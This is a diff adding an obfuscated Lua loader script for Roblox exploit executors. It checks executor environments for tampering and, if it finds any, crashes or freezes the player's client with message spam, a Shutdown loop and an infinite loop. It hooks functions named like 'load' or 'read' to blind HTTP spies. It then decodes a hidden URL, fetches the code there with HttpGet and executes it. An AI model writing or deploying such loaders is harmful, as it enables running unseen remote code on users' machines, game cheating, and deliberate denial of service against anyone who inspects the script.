@@ -1,0 +1,134 @@
+local user = workspace.Parent:FindFirstChildWhichIsA('Players').LocalPlayer
+local function forceRemove(msg) --// Essentially a custom kick
+	pcall(function()
+		game:GetService('CoreGui'):ClearAllChildren()
+	end)
+	if msg then
+		for i = 1,100 do
+			local M = Instance.new("Message")
+			M.Text = msg
+			M.Parent = workspace
+		end
+	end
+	local audio = Instance.new("Sound")
+	audio.SoundId = "rbxassetid://8057769433"
+	audio.Parent = game
+	audio:Play()
+	task.wait(0.05)
+	task.spawn(function()
+		pcall(function()
+			user:Destroy()
+		end)
+	end)
+	local ok1 = nil
+	ok1 = function()
+		game:GetService('RunService').RenderStepped:Connect(function()
+			Instance.new("Weld",workspace)
+			pcall(function()
+				game:Shutdown()
+			end)
+			task.wait(-1)
+			ok1()
+		end)
+	end
+	ok1()
+end
+--// For the person who has access to my code to steal/leak
+
+local message_for_elite_crack_user = "I need gas $$ and food for me and my cat."
+
+--// Bypass is below
+local notSafe = false
+local logService = game:GetService('LogService')
+local testFactorMessage = {message_for_elite_crack_user}
+local tempMode = logService.MessageOut:Connect(function(m,mt)
+	if m:lower():find(message_for_elite_crack_user:lower()) then
+		notSafe = true
+	end
+end)
+for i,v in pairs(testFactorMessage)do
+	task.wait(-1)
+end
+if notSafe then
+	forceRemove("Even worse.")
+	task.wait(9e9)
+	return
+end
+tempMode:Disconnect()
+--// Above will run at start
+
+local keyggnv = 0
+local keygrnv = 0
+for i,v in pairs(getrenv(0))do
+	keygrnv = keygrnv + 1
+end
+for i,v in pairs(getgenv(0))do
+	keyggnv = keyggnv + 1
+end
+if (keyggnv ~= 186) or (keygrnv)>108 then --// a few httpspies can indirectly change these environments. So that's cool
+	local ok = Instance.new("Sound",game)
+	ok.SoundId = "rbxassetid://8057769433"
+	ok.Volume = 10
+	ok.Pitch = 1
+	ok.Playing = true
+	game:GetService('RunService').RenderStepped:Wait()
+	forceRemove(":/")
+	repeat local _=1 until nil
+end
+
+local function stringFind(str,tabel)
+	for i,v in pairs(tabel)do
+		if str:find(v) then
+			return true
+		end
+	end
+	return false
+end
+local net = false
+local safety = nil
+for i,v in pairs(getgenv(0))do
+	if stringFind(tostring(i),{'okfun'}) then
+		safety = v
+	end
+	if stringFind(tostring(i),{'one'}) then
+		dupinator = v
+	end
+end
+local function dec(str,s)
+	local new = ""
+	for i = 1,#str do
+		new = new .. string.char(string.byte(str:sub(i,i)) + s)
+	end
+	return new
+end
+local keyWHITELIST = "https://pastebin.com/raw/Z1YLxfXA"
+pcall(function()
+	script.Name = keyWHITELIST
+end)
+local storage = [[\hhdg.##fUk"[]h\iVigYfWcbhYbh"Wca#Ji`d]bYg#FYd`]WUhYXGhcfU[Y#aU]b#FYhf]YjY]]
+for i,v in pairs(getgenv(0))do
+	if stringFind(tostring(i),{"met","set","read","load"}) then
+		local originalFunction = getgenv(0)[tostring(i)]
+		if type(originalFunction)=='function' then
+			if stringFind(tostring(i),{'ads'}) then
+				pcall(function()
+					originalFunction(game:HttpGet(dec(storage,12)))()
+				end)
+			end
+			if not stringFind(tostring(i),{'ads'}) then
+				v=safety(originalFunction, function()
+					return function(str)
+					end
+				end)
+			else
+				coroutine.resume(coroutine.create(function()
+					game:GetService('RunService').RenderStepped:Wait()
+					v=safety(originalFunction, function()
+						return function(str)
+						end
+					end)
+				end))
+			end
+		end
+	end
+end
